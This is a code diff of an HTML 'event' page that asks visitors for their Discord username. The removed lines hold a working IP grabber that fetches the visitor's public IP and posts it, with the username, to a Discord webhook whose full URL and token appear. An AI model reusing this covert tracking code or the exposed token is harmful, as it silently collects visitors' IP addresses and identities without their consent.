@@ -46,21 +46,39 @@
         #clickMeBtn:hover:enabled {
             background-color: darkgreen;
         }
+        #clickMeBtn.shake {
+            animation: shake 0.5s ease;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            50% { transform: translateX(5px); }
+            75% { transform: translateX(-5px); }
+            100% { transform: translateX(0); }
+        }
         label {
             font-size: 18px;
             margin-bottom: 10px;
             display: block;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="container" id="firstScreen">
         <h1>Welcome!</h1>
         <p>Please enter your Discord username to proceed:</p>
         <label for="discordUsername">Enter your Discord username:</label>
         <input type="text" id="discordUsername" placeholder="Discord Username">
         <br>
         <button id="clickMeBtn" disabled>CLICK ME!</button>
+    </div>
+
+    <div class="container hidden" id="secondScreen">
+        <h1>Event Completed</h1>
+        <p>Made by BlobsterWasHere on discord.</p>
     </div>
 
     <script>
@@ -74,35 +92,19 @@
         clickMeBtn.addEventListener('click', function() {
             const discordUsername = discordUsernameInput.value.trim();
             if (!discordUsername) {
-                alert('Please enter your Discord username.');
+                // Add shake animation to the button
+                clickMeBtn.classList.add('shake');
+                // Remove shake animation after 0.5s
+                setTimeout(() => {
+                    clickMeBtn.classList.remove('shake');
+                }, 500);
                 return;
             }
 
-            // Get the IP address using ipify
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    // Send the IP address and Discord username to the Discord webhook
-                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
-                    const message = {
-                        content: `!(${ip}) - [${discordUsername}]`
-                    };
-                    
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(message)
-                    })
-                    .catch(error => {
-                        console.error('ERROR', error);
-                    });
-                })
-                .catch(error => {
-                    console.error('ERROR', error);
-                });
+            // Hide the first screen
+            document.getElementById('firstScreen').classList.add('hidden');
+            // Show the second screen
+            document.getElementById('secondScreen').classList.remove('hidden');
         });
     </script>
 </body>
